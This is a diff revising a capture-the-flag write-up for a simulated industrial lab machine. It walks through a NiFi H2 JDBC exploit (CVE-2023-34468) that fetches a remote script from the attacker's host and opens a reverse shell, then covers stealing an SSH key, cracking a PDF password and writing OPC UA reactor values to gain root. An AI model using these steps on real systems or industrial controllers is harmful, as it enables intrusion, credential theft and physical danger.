@@ -17,7 +17,7 @@ tags: [linux, apache-nifi, h2, ics, cve-2023-34468, opc-ua]
 
 ## TL;DR
 
-An industrial workflow simulated on **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). The `ExecuteSQL` processor accepts a `DBCPConnectionPool` with whatever JDBC URL you supply: point it at your own **H2** database with `CREATE ALIAS` and Java runs inside NiFi's JVM (**CVE-2023-34468**), yielding a shell as `nifi`. After that, an SSH key backup in the service's support files gets you in as `operator`, and escalation arrives through the internal OPC UA service plus the maintenance console.
+An industrial workflow simulated on **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). The canvas is served **without authentication** and the anonymous user holds `canWrite: true`, the misconfiguration that makes the CVE exploitable. The `ExecuteSQL` processor accepts a `DBCPConnectionPool` with whatever JDBC URL you supply: point it at your own **H2** database with `CREATE ALIAS` and Java runs inside NiFi's JVM (**CVE-2023-34468**), yielding a shell as `nifi`. After that, an SSH key backup in the service's support files gets you in as `operator`, and escalation arrives through the internal OPC UA service plus the maintenance console.
 
 ## Recon
 
@@ -36,7 +36,7 @@ ffuf -u http://<IP> -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
 echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
 ```
 
-NiFi's UI is reachable, with an open canvas or weak install credentials.
+`/nifi-api/flow/about` confirms `"version":"1.21.0"`, the last release before the patch. The canvas loads with no login: there are no credentials to break.
 
 ## Foothold: H2 inside NiFi
 
@@ -60,7 +60,7 @@ nc -lvnp 4444
 ```
 
 ```text
-nifi@helix:/opt/nifi/nifi-current$
+nifi@helix:/opt/nifi-1.21.0$
 ```
 
 When the INIT does not fit in the URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, with the `CREATE ALIAS` and the `CALL` in the script.
@@ -68,26 +68,32 @@ When the INIT does not fit in the URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'ht
 ## Pivot to operator
 
 ```bash
-find /opt/nifi -iname "*.bak" -o -iname "*.zip" -o -iname "id_*" 2>/dev/null
-cat /opt/nifi/nifi-current/conf/*.properties | grep -i "pass\|secret"
+ls /opt/nifi-1.21.0/support_bundles/
+# operator_id_ed25519.bak
+cat /opt/nifi-1.21.0/support_bundles/operator_id_ed25519.bak > /tmp/op.key
+chmod 600 /tmp/op.key
+ssh -i /tmp/op.key operator@<IP>
 ```
 
-The support backups hold an SSH private key and the `operator` user. A protected PDF in that home points at the internal service.
+The support bundle stores `operator`'s ed25519 key in clear text. Their home holds a password-protected `maintenance.pdf` (`pdf2john` + rockyou) and a PNG with the control diagram: the PDF describes the maintenance window, and its password is **the same one the OPC UA server accepts**.
 
 ## Escalation
 
 ```bash
-ss -ltnp | grep -v 127.0.0.1
+ss -ltnp
+# 127.0.0.1:4840  OPC UA  (opc.tcp://127.0.0.1:4840/helix/)
+# 127.0.0.1:8081  reactor HMI
+sudo -l
+# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
 ```
 
-The simulator's internal **OPC UA** (4840) shows up. From the internal network a tag triggers the maintenance window; during that window the `sudo`-allowed console can run:
+Tunnel 4840 (`ssh -L 4840:127.0.0.1:4840 operator@<IP>`) and write reactor nodes: `MODE=MAINTENANCE` and `CalibrationOffset=11.0`, which pushes the temperature to **295 °C**. The safety controller — not the operator's mode switch — then grants the window by writing `maintenance_window`; only with that file present does the console start:
 
 ```bash
-sudo -l
-sudo /usr/local/bin/maintenance-console
+sudo /usr/local/sbin/helix-maint-console
 ```
 
-From there, commands as root.
+Inside it, commands as root.
 
 ## Evidence (redacted)
 
